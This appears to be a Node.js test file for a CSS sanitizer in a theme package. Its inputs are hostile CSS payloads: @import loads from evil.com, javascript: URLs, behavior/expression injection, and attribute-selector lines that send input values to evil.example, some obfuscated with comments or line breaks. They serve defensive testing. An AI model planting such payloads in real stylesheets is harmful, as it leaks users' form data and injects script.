import assert from 'node:assert/strict';
import test from 'node:test';
import { sanitizeCustomCss, buildThemeCss } from './theme-package.ts';

test('sanitizeCustomCss removes @import statements', () => {
  const css = '@import url("https://evil.com/style.css"); @import"https://evil.com/no-space.css"; @im/**/port url("https://evil.com/comment.css"); body { color: red; }';
  assert.equal(sanitizeCustomCss(css).trim(), 'body { color: red; }');
});

test('sanitizeCustomCss removes javascript url protocols', () => {
  const css = 'div { background-image: url("javascript:alert(1)"); }';
  assert.equal(sanitizeCustomCss(css).replace(/\s+/g, ' ').trim(), 'div { background-image: ; }');
});

test('sanitizeCustomCss removes behavior and expression', () => {
  const css = 'div { behavior: url(xss.htc); width: expression(alert(1)); height: 100px; }';
  const sanitized = sanitizeCustomCss(css);
  assert.equal(sanitized.includes('expression'), false);
  assert.equal(sanitized.includes('behavior'), false);
  assert.equal(sanitized.includes('height: 100px;'), true);
});

test('buildThemeCss applies sanitization', () => {
  const output = buildThemeCss({
    styleCss: 'main { display: block; }',
    config: {},
    customCss: '@import url("https://evil.com/leak.css"); p { color: blue; }',
  });
  assert.equal(output.includes('@import'), false);
  assert.equal(output.includes('p { color: blue; }'), true);
});

test('sanitizeCustomCss blocks backslash line-continuation, multiline url, and external image-set', () => {
  const css = [
    'input[value^="a"] { background: url("ht\\\ntps://evil.example/leak?a"); }',
    'input[value^="b"] { background: url("https://evil.example/\nleak?b"); }',
    'input[value^="c"] { background-image: image-set("https://evil.example/c.png" 1x); }',
    'input[value^="d"] { background-image: -webkit-image-set(url("//evil.example/d.png") 1x); }',
    'body { background-image: image-set("/api/theme/assets/bg.webp" 1x); }',
  ].join('\n');
  const sanitized = sanitizeCustomCss(css);
  assert.equal(sanitized.includes('evil.example'), false);
  assert.equal(sanitized.includes('/api/theme/assets/bg.webp'), true);
});

